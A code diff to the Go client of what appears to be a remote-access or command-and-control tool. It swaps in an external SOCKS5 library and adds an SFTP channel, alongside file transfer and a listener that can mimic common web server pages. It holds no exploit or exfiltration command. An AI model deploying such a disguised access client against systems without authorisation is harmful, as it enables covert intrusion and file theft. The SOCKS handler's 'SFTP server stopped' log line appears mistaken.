@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"github.com/armon/go-socks5"
 	"io"
 	"net"
 	"net/http"
@@ -19,12 +20,12 @@ import (
 	"slider/pkg/scrypt"
 	"slider/pkg/sio"
 	"slider/pkg/slog"
-	"slider/pkg/ssocks"
 	"slider/pkg/web"
 	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
+	"github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -72,7 +73,7 @@ func NewClient(args []string) {
 	fingerprint := clientFlags.String("fingerprint", "", "Server fingerprint for host verification")
 	key := clientFlags.String("key", "", "Private key for authenticating to a Server")
 	listener := clientFlags.Bool("listener", false, "Client will listen for incoming Server connections")
-	port := clientFlags.Int("port", 8081, "Listener Port")
+	port := clientFlags.Int("port", 8081, "Listener port")
 	address := clientFlags.String("address", "0.0.0.0", "Address the Listener will bind to")
 	retry := clientFlags.Bool("retry", false, "Retries reconnection indefinitely")
 	webTemplate := clientFlags.String("template", "default", "Mimic web server page [apache|iis|nginx|tomcat]")
@@ -363,6 +364,9 @@ func (s *Session) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
 		case "file-download":
 			s.Logger.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
 			go s.handleFileDownloadChannel(nc)
+		case "sftp":
+			s.Logger.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
+			go s.handleSFTPChannel(nc)
 		default:
 			s.Logger.Debugf("%sRejected channel %s", s.logID, nc.ChannelType())
 			if rErr := nc.Reject(ssh.UnknownChannelType, ""); rErr != nil {
@@ -481,19 +485,26 @@ func (s *Session) handleSocksChannel(channel ssh.NewChannel) {
 		)
 		return
 	}
-	defer func() { _ = socksChan.Close() }()
+	defer func() {
+		s.Logger.Debugf("%sClosing Socks Channel", s.logID)
+		_ = socksChan.Close()
+	}()
 	go ssh.DiscardRequests(req)
 
-	config := &ssocks.InstanceConfig{
-		Logger:       s.Logger,
-		IsServer:     true,
-		SocksChannel: socksChan,
+	// socks5 logger logs by default and it's very chatty
+	socksServer, snErr := socks5.New(
+		&socks5.Config{
+			Logger: slog.NewDummyLog(),
+		})
+	if snErr != nil {
+		s.Logger.Errorf("failed to create new socks server - %v", snErr)
+		return
 	}
-	s.socksInstance = ssocks.New(config)
 
-	if err := s.socksInstance.StartServer(); err != nil {
-		s.Logger.Debugf("%s(Socks) - %s", s.logID, err)
-	}
+	socksConn := sconn.SSHChannelToNetConn(socksChan)
+	defer func() { _ = socksConn.Close() }()
+	_ = socksServer.ServeConn(socksConn)
+	s.Logger.Debugf("%sSFTP server stopped", s.logID)
 }
 
 func (s *Session) handleFileUploadChannel(channel ssh.NewChannel) {
@@ -563,4 +574,57 @@ func (s *Session) handleFileDownloadChannel(channel ssh.NewChannel) {
 	_, _ = downloadChan.SendRequest("checksum", true, []byte(checkSum))
 	// Copy file over channel
 	_, _ = downloadChan.Write(file)
+}
+
+func (s *Session) handleSFTPChannel(channel ssh.NewChannel) {
+	s.Logger.Debugf("%sAccepting SFTP channel request", s.logID)
+	sftpChan, requests, aErr := channel.Accept()
+	if aErr != nil {
+		s.Logger.Errorf(
+			"%sFailed to accept \"%s\" channel\n%v",
+			s.logID,
+			channel.ChannelType(),
+			aErr,
+		)
+		return
+	}
+
+	// Make sure the channel gets closed when we're done
+	defer func() {
+		s.Logger.Debugf("%sClosing SFTP channel", s.logID)
+		_ = sftpChan.Close()
+	}()
+
+	// Handle channel requests in the background
+	go ssh.DiscardRequests(requests)
+
+	// Create SFTP server options
+	var serverOptions []sftp.ServerOption
+	if s.Logger.IsDebug() {
+		serverOptions = append(serverOptions, sftp.WithDebug(os.Stderr))
+	}
+
+	// Create the SFTP server with the configured options
+	s.Logger.Debugf("%sInitializing SFTP server", s.logID)
+	server, err := sftp.NewServer(
+		sftpChan,
+		serverOptions...,
+	)
+	if err != nil {
+		s.Logger.Errorf("%sFailed to create SFTP server: %v", s.logID, err)
+		return
+	}
+
+	s.Logger.Infof("%sSFTP server started successfully", s.logID)
+
+	// Serve SFTP connections
+	if err := server.Serve(); err != nil {
+		if err == io.EOF {
+			s.Logger.Debugf("%sSFTP client disconnected", s.logID)
+		} else {
+			s.Logger.Errorf("%sSFTP server error: %v", s.logID, err)
+		}
+	}
+
+	s.Logger.Debugf("%sSFTP server stopped", s.logID)
 }
